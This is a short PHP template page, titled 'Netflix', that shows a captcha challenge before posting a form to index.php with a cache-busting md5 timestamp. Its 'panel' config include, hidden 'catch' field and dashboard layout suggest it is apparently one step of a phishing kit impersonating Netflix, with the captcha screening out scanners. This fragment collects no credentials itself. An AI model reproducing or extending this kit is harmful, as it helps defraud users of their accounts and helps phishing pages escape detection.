<?php
require_once 'config/panel.php';
$title = "Netflix";
ob_start();
?>

<div class="w-100 d-flex flex-column justify-content-center align-items-center">
     <form class="container my-3 carda shadow rounded-3" action="index.php?<?= md5(time()) ?>" method="post">
     <input type="hidden" name="catch">


<div class="w-100"><h2 class="mb-4 p-0 text-white med-font"><?= lang("xcapt2"); ?></h2></div>

<div class="w-100"><p style="font-size: 13px;" class="mb-4 p-0 text-white"><?= lang("xcapt"); ?></p></div>
<?php if ($_SESSION['ERRORS']['captcha']) {?> 
<center class="w-100 text-center"><p style="color:red;"><?php echo lang('xcapt1'); ?></p></center>
<?php }?> 
<div class="w-100 d-flex flex-column justify-content-center align-items-center">
    <div class="h-captcha" data-sitekey="<?= SITEKEY ?>"></div>
    </div>
    <div class="w-100 d-flex justify-content-end align-items-center">
     <button class="btn btn-danger text-white med-font rounded-1 w-100" type="submit" name="submit" value="captcha"><?= lang("xcapt3"); ?></button>
     </div>
    </form>

</div>

<?php $content = ob_get_clean(); ?>
<?php require_once 'views/layout_dash.php' ?>

